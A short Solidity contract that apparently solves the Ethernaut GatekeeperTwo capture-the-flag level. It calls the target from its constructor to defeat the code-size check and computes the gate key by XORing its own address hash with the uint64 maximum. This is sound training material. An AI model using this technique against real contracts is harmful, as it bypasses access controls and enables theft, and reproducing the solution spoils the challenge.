// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoHack {
    error AttackFailed();

    GatekeeperTwo private immutable TARGET;

    constructor(address _target) {
        TARGET = GatekeeperTwo(_target);
        uint64 key64 = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        bytes8 _gateKey = bytes8(key64);
        if (!TARGET.enter(_gateKey)) revert AttackFailed();
    }
}
